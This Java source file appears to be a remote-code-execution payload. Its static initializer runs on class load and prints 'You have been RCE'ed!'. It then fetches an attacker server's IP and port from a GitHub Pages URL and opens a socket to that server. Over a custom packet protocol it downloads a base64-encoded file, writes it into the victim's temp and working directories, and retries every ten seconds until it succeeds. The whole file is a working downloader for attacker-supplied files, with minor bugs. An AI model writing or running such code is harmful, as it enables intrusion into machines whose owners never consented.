import javax.net.ssl.HttpsURLConnection;
import java.io.*;
import java.net.Socket;
import java.net.URL;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class Payload {

    static{
        System.out.println("You have been RCE'ed!");
        try {
            URL url = new URL("https://reallakshyak2011.github.io/HackIpFetcher");
            boolean success = false;
            Map<String, String> attributes = new HashMap<>();

            while(!success) {
                HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
                conn.setInstanceFollowRedirects(true);
                conn.connect();

                InputStream stream = conn.getInputStream();

                String responce = new String(readAllBytes(stream));

                String[] attrs = responce.split(",");

                for (String a : attrs) {
                    String[] key_value_pair = a.trim().split("=");
                    attributes.put(key_value_pair[0], key_value_pair[1]);
                }

                String attackerIP = attributes.get("HACK_SERVER_IP");
                int attackerPort = Integer.parseInt(attributes.get("HACK_SERVER_PORT"));

                try{
                    System.out.println("Ip is : " + attackerIP);
                    System.out.println("Port is: " + attackerPort);
                    Socket hackServerConSock = new Socket(attackerIP, attackerPort);
                    File payload = downloadPayload(hackServerConSock);
                    if (payload != null){
                        success = true;
                    }else{
                        throw new RuntimeException("Payload is null!");
                    }

                    payload.renameTo(new File(System.getProperty("user.dir") + "\\" + payload.getName()));
                }catch (Exception e){
                    System.out.println("Error while downloading Payload: " + e.getClass().getCanonicalName() + ": " + e.getMessage());
                }finally {
                    System.out.println("\n\n");
                }
                if(!success)
                    TimeUnit.SECONDS.sleep(10);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }finally {
            System.out.println("\n\n");
        }

    }

    public static byte[] readAllBytes(InputStream in) throws IOException {
        List<Byte> list = new ArrayList<>();
        int intBuf;
        while ((intBuf = in.read()) != -1){
            list.add((byte) intBuf);
        }

        byte[] byteBuff = new byte[list.size()];

        int pI = 0;
        for(Byte b : list){
            byteBuff[pI] = b.byteValue();
            pI++;
        }

        return byteBuff;
    }

    public static File downloadPayload(Socket sock) throws IOException {
        if (sock.isClosed()) {return null;}

        //Prepare packet
        Map<String, String> attr = new HashMap<>();
        attr.put("ARCH", System.getProperty("os.arch"));

        sendPacket(sock, new Packet("PAYLOAD_DOWN", attr, null));
        Packet packet = recievePacket(sock);
        if(packet.getFunction().equals("PAYLOAD_UP")){
            if(packet.getAttributes().containsKey("FILE_NAME")){
                File payloadFile = new File(System.getProperty("java.io.tmpdir") + "\\" + packet.getAttributes().get("FILE_NAME"));
                payloadFile.delete();
                payloadFile.createNewFile();
                FileOutputStream payloadDestWriter = new FileOutputStream(payloadFile);
                payloadDestWriter.write(Base64.getDecoder().decode(packet.getPayload()));
            }else {
                System.out.println("Returning null as FILE_NAME attribute is not in packet!\nPacket: " + packet);
            }
        }else{
            System.out.println("Returning null as function isnt PAYLOAD_UP, it is: " + packet.getFunction());
            return null;
        }
        return null;
    }

    public static void sendPacket(Socket sock, Packet packet) throws IOException {
        if (sock.isClosed()) {return ;}

        OutputStream sOu = sock.getOutputStream();

        sOu.write(packet.toString().getBytes());
        sOu.flush();
    }

    public static Packet recievePacket(Socket socket) throws IOException {
        InputStream sIn = socket.getInputStream();

        boolean deadPacket = false;
        StringBuilder functionStrBuilder = new StringBuilder();
        StringBuilder attrStrBuilder = new StringBuilder();
        StringBuilder payloadStrBuilder = new StringBuilder();

        char chr = 'a';

        //Read Till Packet Starts
        while (chr != '.'){
            chr = (char) sIn.read();
        }

        //Get the function
        chr = 'a';
        while (chr != ':'){
            chr = (char) sIn.read();
            functionStrBuilder.append(chr);
        }
        functionStrBuilder.deleteCharAt(functionStrBuilder.length()-1);

        //Get Attributes
        chr = 'a';
        while (chr != ':'){
            chr = (char) sIn.read();
            attrStrBuilder.append(chr);
        }
        attrStrBuilder.deleteCharAt(attrStrBuilder.length()-1);

        //Make Attributes in Map
        Map<String, String> attrMap = new HashMap<>();
        for (String key_value_pair : attrStrBuilder.toString().split(",")){
            String[] key_value = key_value_pair.split("=");
            if (key_value.length != 2){ deadPacket = true; break;}
            attrMap.put(key_value[0], key_value[1]);
        }

        if (!attrMap.containsKey("LENGTH")) deadPacket = true;


        int payloadLength = 0;
        try {
            payloadLength = Integer.parseInt(attrMap.get("LENGTH"));
        }catch (NumberFormatException e){
            deadPacket = true;
        }

        for(int i = 1; i <= payloadLength; i++){
            int intByteBuf = sIn.read();
            if (intByteBuf == -1){
                deadPacket = true;
                break;
            }

            payloadStrBuilder.append(((char) intByteBuf));
        }

        //Print For Test
        System.out.println("Function: " + functionStrBuilder);
        System.out.println("Attributes: " + attrStrBuilder);
        System.out.println("Payload: " + payloadStrBuilder);

        if(deadPacket) return null;
        return new Packet(functionStrBuilder.toString(), attrMap, payloadStrBuilder.toString());
    }

    static class Packet{
        private final String function;
        private final Map<String, String> attributes;
        private final String payload;
        public Packet(String function, Map<String, String> attrs, String payload){
            this.function = function;
            this.attributes = attrs;

            if(payload == null){
                payload = "";
            }
            this.payload = payload;
        }

        public String getFunction() {
            return function;
        }

        public String getPayload() {
            return payload;
        }

        public Map<String, String> getAttributes() {
            return attributes;
        }

        public String toString(){
            StringBuilder packetStrBuilder = new StringBuilder();

            packetStrBuilder.append('.');
            packetStrBuilder.append(function);
            packetStrBuilder.append(':');

            for (Map.Entry e : attributes.entrySet()){
                //Continue to not add it as we will add it after loop completes.
                if(e.getKey().equals("LENGTH")) continue;

                packetStrBuilder.append(e.getKey());
                packetStrBuilder.append('=');
                packetStrBuilder.append(e.getValue());
                packetStrBuilder.append(',');
            }

            packetStrBuilder.append("LENGTH=" + payload.length() + ":");


            packetStrBuilder.append(payload);
            return packetStrBuilder.toString();
        }
    }

    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec("pause");
    }
}

